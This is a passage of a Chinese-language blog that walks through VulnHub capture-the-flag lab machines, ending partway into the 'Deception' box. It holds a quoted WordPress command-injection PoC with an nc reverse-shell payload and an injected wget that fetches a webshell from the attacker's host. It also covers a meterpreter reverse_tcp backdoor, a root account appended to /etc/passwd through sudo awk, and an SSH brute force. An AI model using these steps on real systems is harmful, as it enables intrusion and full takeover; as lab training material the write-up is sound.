http:&#x2F;&#x2F;192.168.31.36&#x2F;css&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;html&#x2F;                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;img&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;index.html (CODE:200|SIZE:3135)                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;js&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.36&#x2F;server-status (CODE:403|SIZE:278)                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2><p>枚举wordpress账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.36&#x2F;wordpress&#x2F; -e u</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] web</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>尝试爆破弱口令，失败</p><p>浏览静态文件时发现图片文件<code>/img/flaghost.png</code><br />图片本身并没有有效信息<br />下载至本地，用LSB隐写检测程序<code>zsteg</code>检测图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg flaghost.png </span><br><span class="line">meta Make           .. text: &quot;passw@45&quot;</span><br></pre></td></tr></table></figure><p>得到字符串<code>passw@45</code></p><p>这里尝试过用这个字符串作为密码来登入wordpress和ssh服务，但都失败<br />尝试后发现路径<code>/passw@45/</code><br />该路径下存在文本<code>flag2.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]</span><br><span class="line">&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;</span><br><span class="line">+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;---</span><br><span class="line">----&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>brainfuck编码</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br />在这个链接解码后得到账户<br /><code>web:Hacker@4514</code><br />这个账户可以用于登入wordpress服务，也可以登入ssh服务</p><hr /><p>这里赘述一下wordpress的渗透思路<br />登入wordpress之后在Plugins面板看到<code>Plainview Activity Monitor</code></p><p>搜索相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Plainview Activity Monitor</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                           |  Path</span><br><span class="line">                                                                                         | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line">----------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>阅读相关文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.html</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>这里则需要访问<code>/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</code></p><p>个人尝试POC所给出的反弹Shell命令时无效，选择先上传php木马再上传meterpreter后门程序的方法</p><p>这里需要注意一点，输入框的相关代码如下<br /><code>&lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt;</code><br />maxlength会限制输入的长度，size会限制显示已输入字符的长度，使用F12适当修改即可</p><p>尝试命令注入<br /><code>a.b|ls</code><br />回显得到文件列表</p><p>本地构建php后门并开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass shell.php</span><br><span class="line">python -m SinpleHTTPServer 9900</span><br></pre></td></tr></table></figure><p>注入下载命令<br /><code>a.b|wget http://192.168.31.10:9900/shell.php</code></p><p>连接木马<br /><code>weevely http://192.168.31.36/wordpress/wp-admin/shell.php</code></p><p>查看系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造后门程序<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf</code></p><p>MSF开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9933</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传后门并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_upload msf.elf &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;msf.elf</span><br><span class="line">.&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>MSF接收到shell<br />之后可能需要靠玩家开脑洞切换到web账户（比如看到passwd文件里存在web账户联想到密码共用）</p><h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh web@192.168.31.36</span><br><span class="line">Hacker@4514</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for web on jax:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User web may run the following commands on jax:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk</span><br></pre></td></tr></table></figure><p>可以以root权限执行awk命令<br />可以用awk命令修改文件<code>/etc/passwd</code></p><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">user-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bash</span><br><span class="line">web:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>构造账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1</span><br><span class="line">echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39;</span><br></pre></td></tr></table></figure><p>openssl命令需在本地运行</p><p>写入账户信息<br /><code>sudo -u root awk '/web:\/bin\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p><p>切换至root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>localhost</p></blockquote><p>修改文件<code>/etc/hosts</code>，将<code>127.0.0.1 localhost</code>这一行前面加上’#’，再写入<code>IP localhost</code>。这样就解决了点击链接时总是跳转localhost的问题。本地测试时，Chrome访问localhost还是会有问题，而Firefox可以正常访问。</p><blockquote><p>awk</p></blockquote><p>需要通过正则匹配到文件最后的一段字符串，再写入账户信息，否则写入过多数据。</p><blockquote><p>当你收集到的信息越少的时候，需要继续挖掘的地方就越多</p></blockquote><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/jackchen001/p/7111324.html">awk.write</a></p></blockquote><hr /><h1 id="deception"><a class="markdownIt-Anchor" href="#deception"></a> <a href="https://www.vulnhub.com/entry/haclabs-deception,427/">Deception</a></h1><p><code>2020/03/19 19:06:44</code></p><h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.207</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)</span><br><span class="line">|   256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)</span><br><span class="line">|_  256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 14.153 days (since Wed Mar  4 23:18:19 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-12"><a class="markdownIt-Anchor" href="#web路径枚举-12"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.207 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026)                                                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F;                                                                                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F;                                                                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279)                                                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0)                                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22)</span><br></pre></td></tr></table></figure><p>wordpres框架内的链接指向的主机为localhost，需要将文件<code>/etc/hosts</code>中的<code>127.0.0.1 localhost</code>这一行注释，再写入<code>192.168.31.207 localhost</code>，使用firefox即可正常访问</p><h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2><p>访问<code>/wordpress/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow : &#x2F;robots.html</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/robots.html</code><br />分析js得知点击&quot;show quest&quot;15次之后会跳转至&quot;admindelete.html&quot;</p><p>访问<code>/wordpress/admindelete.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOL,A Noob is looking for a hint</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/himt.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please collect all the API tokens availabe on the home page</span><br></pre></td></tr></table></figure><p>在页面<code>/</code>收集到四段API Token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API old0 : 5F4DCC3B5AA</span><br><span class="line">API old1 : 765D61D8</span><br><span class="line">API old2 : 327DEB</span><br><span class="line">API new : 882CF99</span><br></pre></td></tr></table></figure><p>整理这些API</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat pass </span><br><span class="line"></span><br><span class="line">5F4DCC3B5AA</span><br><span class="line">765D61D8</span><br><span class="line">327DEB</span><br><span class="line">882CF99</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>枚举wordpress框架的用户名/插件/主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] haclabs</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] yash</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>未发现关于插件与主题的有效信息</p><p>整理得到用户名字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line">yash</span><br><span class="line">haclabs</span><br></pre></td></tr></table></figure><p>将其用作口令字典来爆破wordpress登录框，失败</p><p>将其用作口令字典来爆破ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.207   login: yash   password: 5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>得到ssh服务的账户</p><h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2><p>登入ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.207</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>在目录<code>/home/yash</code>下发现隐藏文件<code>.systemlogs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .systemlogs </span><br><span class="line"></span><br><span class="line">ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389</span><br></pre></td></tr></table></figure><p>可以看到有三段内容用引号标识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 